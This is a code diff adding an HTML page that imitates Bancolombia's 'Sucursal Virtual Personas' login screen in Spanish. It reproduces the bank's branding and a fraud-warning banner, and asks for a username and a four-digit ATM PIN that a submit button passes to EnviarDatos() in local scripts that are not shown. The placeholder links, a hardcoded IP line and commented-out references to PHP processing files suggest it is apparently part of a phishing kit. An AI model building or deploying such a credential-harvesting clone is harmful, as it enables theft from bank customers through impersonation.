@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bancolombia Sucursal Virtual Personas</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="icon" type="image/png" href="./Images/FaviconBancolombia.png">
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script type="text/javascript" src="scripts/functions.js"></script>
+  <script type="text/javascript" src="scripts/jquery.jclockNew.js"></script>
+
+
+  <!-- <script type="text/javascript" src="process/inicio.php"></script> -->
+  <!-- <script type="text/javascript" src="process/pasousuario.js"></script> -->
+</head>
+<body class="min-h-screen bg-[#f5f5f5] text-black bg-[url('./Images/fondo.svg')] bg-no-repeat bg-cover bg-center">
+   
+
+  <main class="flex flex-col items-center min-h-screen ">
+    <!-- Logo -->
+    <div class="mt-[65px] text-center">
+      <img src="./Images/BancolombiaLogo.png" alt="Bancolombia" class="mx-auto w-[190px]">
+      <h1 class="text-[27px] md:text-[38px] text-[#2c2a29] mt-[35px] font-extralight">Sucursal Virtual Personas</h1>
+    </div>
+
+    <!-- Alerta -->
+    <div class="mt-[30px] md:mt-[20px] w-[95%] max-w-[1200px] md:max-w-[500px] lg:max-w-[35%] bg-black text-white rounded-[10px] shadow-lg flex">
+      <div class="2xl:w-[70px] lg:w-[120px] md:w-[100px] w-[70px] bg-[#fdda24] flex   justify-center rounded-l-[10px] pt-[8px]">
+        <img src="./Images/bosina.png" alt="Alerta" class="w-[32px] h-[32px]">
+      </div>
+      <div class="p-[16px] bg-[#2c2a29] rounded-r-[12px] text-[14px] md:text-[16px]">
+        <p class="font-semibold">¡Protege tu plata de los delincuentes!</p>
+        <p class="mt-[10px] md:leading-tight">Nunca te pediremos que envíes plata a una cuenta, ni que entregues usuario, clave de cajero, clave dinámica o información de tus tarjetas por llamadas o WhatsApp. ¡No Pasa hasta que Pasa!</p>
+      </div>
+    </div>
+
+    <!-- Formulario -->
+    <section class="relative mt-[25px] md:mt-[20px] w-[95%] md:px-[50px] lg:max-w-[35%] md:max-w-[500px] bg-white rounded-[8px] shadow-lg p-[24px]">
+      <!-- Decoración -->
+      
+      
+
+      <h2 class="text-center text-[20px] font-semibold mt-[10px] md:text-[22px]">¡Hola!</h2>
+      <p class="text-center text-[16px] mt-[12px] mb-[24px] md:text-[17px] md:font-extralight md:md:leading-tight ">Ingresa los datos para gestionar tus productos y hacer transacciones.</p>
+
+      <!-- Usuario -->
+        <div class="mb-[16px] mt-[58px] relative">
+                <label id="labelUsuario" class="absolute left-[30px] top-[0] text-[16px]  text-black transition-all duration-200 pointer-events-none">
+                    Usuario
+                </label>
+                <img src="./Images/usuario.png" class="absolute w-[22px]" alt="usuario">
+                <div class="flex items-center gap-[8px]">
+                    <input type="text" id="inputUsuario" class="w-full border-b border-black focus:outline-none pl-[30px]  pb-[4px] text-[16px]" onfocus="handleFocus(this)" onblur="handleBlur(this)" oninput="verificarInputsLlenos()">
+                </div>
+                <p class="block text-red-500 text-[12px] invisible">Ingresa tu usuario</p>
+                <a href="#" class="text-[12px] underline text-black inline-block font-bold">¿Olvidaste tu usuario?</a>
+            </div>
+
+        <!-- Clave -->
+        <div class="mb-[16px] mt-[58px] relative">
+                <label id="labelClave" class="absolute left-[30px] top-[0] text-[16px]    text-black transition-all duration-200 pointer-events-none">
+                    Clave del cajero
+                </label>
+                <img src="./Images/candado.png" class="absolute w-[18px]" alt="usuario">
+                <div class="flex items-center gap-[8px]">
+
+              <input 
+                type="password" 
+                id="inputClave" 
+                maxlength="4" 
+                class="w-full border-b border-black focus:outline-none pl-[30px] pb-[4px] text-[16px]" 
+                onfocus="handleFocusClave(this)" 
+                onblur="handleBlurClave(this)" 
+                oninput="this.value = this.value.replace(/[^0-9]/g, ''); verificarInputsLlenos()">
+                
+                </div>
+                <p class="block text-red-500 text-[12px] invisible">Ingresa tu clave</p>
+                <a href="#" class="text-[12px] underline text-black inline-block font-bold">¿Olvidaste tu clave?</a>
+            </div>
+
+        <!-- Botón -->
+            <input id="btnLogin" type="button" value="Iniciar sesión" class="w-full bg-gray-300 text-gray-400 py-[12px] rounded-full cursor-not-allowed mt-[17px] font-bold" disabled="" onclick="EnviarDatos()">     
+            <div class="text-center mt-[16px] md:mb-[16px]">
+            <a href="#" class="text-[14px] font-semibold underline text-black">Crear usuario</a>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class=" w-[95%] lg:w-full max-w-[700px] mt-[60px] lg:pb-[0px] pb-[26px] text-center text-[14px] md:max-w-full text-gray-700 px-[20px]">
+      <div class="md:text-start border-b border-gray-400 flex flex-col md:flex-row justify-center lg:justify-end gap-[16px] pb-[12px] md:leading-tight md:text-[15px]">
+        <a href="#">¿Problemas para conectarte?</a>
+        <span class="hidden sm:inline">·</span>
+        <a href="#">Aprende sobre seguridad</a>
+        <span class="hidden sm:inline">·</span>
+        <a href="#">Reglamento Sucursal Virtual</a>
+        <span class="hidden sm:inline">·</span>
+        <a href="#">Política de privacidad</a>
+      </div>
+
+        <div class="md:flex md:justify-between md:items-center">
+            <div>
+                <img src="./Images/BancolombiaLogo.png" alt="Bancolombia" class="mx-auto w-[160px] my-[14px]">
+                <img src="./Images/vigilado.png" alt="Vigilado" class="mx-auto w-[130px] my-[20px]">
+            </div>
+            <div class="md:text-end">
+                <p class="text-[12px] md:text-[13px]">Dirección IP: 44.144.135.30</p>
+                <p class="text-[12px] md:text-[13px]"></p>
+            </div>
+        </div>
+    </footer>
+  </main>
+
+</body>
+
+<script src="./index.js"></script>
+
+</html>
+
+
+
+
+
